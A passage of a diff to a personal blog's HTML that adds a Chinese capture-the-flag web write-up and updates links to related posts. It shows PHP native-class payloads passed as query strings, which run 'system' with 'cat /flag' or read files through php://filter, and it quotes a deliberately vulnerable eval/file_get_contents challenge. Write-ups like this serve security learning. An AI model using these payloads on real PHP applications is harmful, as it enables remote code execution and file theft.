+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里考一个<a class="link" href="https://blog.csdn.net/veloi/article/details/144374486"  target="_blank" rel="noopener"
+    >PHP8 动态属性被弃用兼容方案_creation of dynamic property is deprecated-CSDN博客</a></p>
+<p><strong>即8.2以下的版本可以PHP 类中可以动态设置和获取没有声明过的类属性</strong></p>
+<p>题目有点问题，应该是crypto0=&ldquo;dev1l&rdquo;。然后打原生类读取文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">X=SplFileObject&amp;Y=php://filter/read=convert.base64-encode/resource=flag.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="ezclass">ezClass
+</h2><h3 id="解法一利用可执行函数的内置类">解法一：利用可执行函数的内置类
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?a=Exception&amp;aa=system&amp;b=Exception&amp;bb=cat /flag&amp;c=getMessage
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Exception（异常类）,getMessage()（返回构造函数中的异常信息）,上面分别返回system,cat /flag,达到执行命令效果
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250418211608895.png" alt="image-20250418211608895" style="zoom:33%;" />
+<h3 id="解法二原生类读取splfileobject文件">解法二：原生类读取SplFileObject文件
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?a=SplFileObject&amp;aa=data://text/plain,system&amp;c=__toString&amp;b=SplFileObject&amp;bb=data://text/plain,cat%20/flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="解法三利用arrayiterator类调用current方法来返回当前的值">解法三:利用ArrayIterator类调用<code>current</code>方法来返回当前的值
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?a=ArrayIterator&amp;aa[]=system&amp;c=current&amp;b=ArrayIterator&amp;bb[]=cat /flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://php.github.net.cn/manual/zh/arrayiterator.current.php"  target="_blank" rel="noopener"
+    >PHP: ArrayIterator::current - PHP中文网</a></p>
+<h2 id="pharme"><strong>pharme</strong>
+</h2><p>源码提示class.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">evil</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="s1">&#39;ch3nx1&#39;</span> <span class="o">===</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/;+/&#39;</span><span class="p">,</span><span class="s1">&#39;ch3nx1&#39;</span><span class="p">,</span><span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[A-Za-z_\(\)]+/&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="p">))){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="o">.</span><span class="s1">&#39;isbigvegetablechicken!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;nonono&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^phar:\/\//i&#39;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;nonono&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
 </div>
 </section>
 
@@ -1199,12 +1736,25 @@
             
                 
 <article class="">
-    <a href="/p/2025-tcgctf-write.up/">
+    <a href="/p/2025-nss-%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-TCGCTF-write.up</h2>
+            <h2 class="article-title">2025-nss-每日一题</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-tgctf-write.up/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-TGCTF-write.up</h2>
         </div>
     </a>
 </article>
@@ -1244,19 +1794,6 @@
 
         <div class="article-details">
             <h2 class="article-title">2025-nctf-web</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2025-sqctf/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025-sqctf</h2>
         </div>
     </a>
 </article>
